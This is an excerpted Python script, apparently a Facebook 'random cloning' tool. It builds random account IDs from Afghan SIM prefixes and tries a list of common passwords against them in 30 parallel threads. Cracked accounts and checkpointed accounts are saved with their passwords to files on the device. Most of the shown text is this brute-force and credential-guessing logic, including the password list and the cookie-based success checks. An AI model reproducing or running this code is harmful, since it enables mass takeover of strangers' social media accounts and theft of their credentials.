...
import zlib
import base64
os.system('\033[1;91mespeak -a 300 "WELCOME TO FAISAL RAHMANI RANDOM CLONING TOOLS"')
...
try:
    ...
    print('\033[1;91m YAGHI IS BEST  COOMANDS')
...
try:
    ...
    print('\033[1;94m BEST AFG CRACK')
...
try:
    ...
    print(' \033[1;95mWELCOME TO FAISAL.R TOOL')
...
try:
    ...
    print(' \033[1;96mWELCOME\033[1;97m TO MY TOOLS ')
...
logo = ("""   
\033[1;91mdb    db  .d8b.   d888b  db   db d888888b 
\033[1;97m`8b  d8' d8' `8b 88' Y8b 88   88   `88'   
 \033[1;91m`8bd8'  88ooo88 88      88ooo88    88    
   \033[1;97m88    88~~~88 88  ooo 88~~~88    88    
   \033[1;91m88    88   88 88. ~8~ 88   88   .88.   
   \033[1;97mYP    YP   YP  Y888P  YP   YP Y888888P 
                           \033[1;91mYAGHI IS BESS🍸 
\033[1;97m═════════════════════════════════════
\033[1;92m[🍸]\033[1;91mOWNER    :   \033[1;91mFAISAL.RAHMANI
\033[1;92m[🍸]\033[1;91mFACEBOOK :    \033[1;91mSHAH FAISAL
\033[1;92m[🍸]\033[1;91mWHATSAPP :   \033[1;91m+93781664079
\033[1;92m[🍸]\033[1;91mTOOLS    :   \033[1;91mFREE
\033[1;92m[🍸]\033[1;91mVERSION  :   \033[1;91m0.1
\033[1;97m═════════════════════════════════════""")

clear()
os.system("xdg-open https://www.facebook.com/profile.php?id=100089491924488")
xxxx = str(len(ugen))
...
def main():
    ...
    clear()
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\033[1;97m[1]\033[1;91mSTART CLONING")
...
def passx():
    ...
    print(logo)
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[37;40m[ SELECT METHOD ] ')
    print('\033[1;32m--------------------------------------------------------------') 
    print("\033[1;97m[1]\033[1;93mAFG CRACK -- M 1")
    print("\033[1;97m[2]\033[1;93mAFG CRACK --M 2")
    print('\033[1;32m--------------------------------------------------------------') 
...
def awm1():
    ...
    clear()        
    print('\033[1;37m--------------------------------------------------------------') 
    print(f"\033[1;32mEXMAPLE")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;91m[!] 9379, 9372,9377, 9376,9370, 9378')
    print(f'\033[1;91m[!] 078,079,074,073,070,073,071')
    print('\033[1;37m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m2000, 3000, 50000, 100000\n\033[1;37mPUT IDS LIMIT :'))
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','۱۰۰۲۰۰','afghan1234','kabul123','khan123','afghanistan123','khan1122','firstlast','lastfirst','first123','last123','80009000','20003000','123456','700800']
    ...
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\033[1;97m[+]\033[1;91m NAME:\033[1;91m "+NameX)
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/FAISAL-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/FAISAL-CP.txt')
...
def awm2():
    ...
    clear()
    print('\033[1;37m----------------------') 
    print(f"\033[1;31mEXMAPLE")
    print('\033[1;37m--------------------------------------------------------------') 
    print(f'\033[1;91m[!]\033[1;91m9379, 9372 ,9377, 9376,9370, 9378')
    print(f'\033[1;91m[!]\033[1;91m078,079,074,073,070,073,071')
    print('\033[1;37m--------------------------------------------------------------') 
    code = input('\033[1;31m SIM CODE ')
    os.system("clear")
    print(logo)   
    print('\033[1;37m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;91m EXAMPLE \033[1;91m: \033[1;91m2000, 3000, 50000, 100000\n\033[1;32m[+]\033[1;91m PUT IDS LIMIT :'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;91m NAME\033[1;91m:\033[1;91m "+NameX)
        print(f"\033[1;97m[+]\033[1;91m SIM CODE YOU CHOICE:\033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;91m TOTAL IDZ\033[1;91m: \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
    ...
    print('\033[1;97m[+]\033[1;92m COMPLETED:\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/FAISAL-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/FAISAL-OK.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
         ...
         # 'cookie': 'datr=ioUhZY_CsM6vYGH5VfvF60Bs; sb=ioUhZS42C69u5bP58Hwyvs2W; m_pixel_ratio=2; wd=360x581; fr=03swDSnoNYdmYQpGB..BlIYWK._H.AAA.0.0.BlIhpE.AWU6W0k3wpg',
            'dpr': '2',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mFAISAL-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n ')
                cek_apk(session,coki)
                open('/sdcard/FAISAL-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mFAISAL-Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                    open('/sdcard/FAISAL-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[FAISAL] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
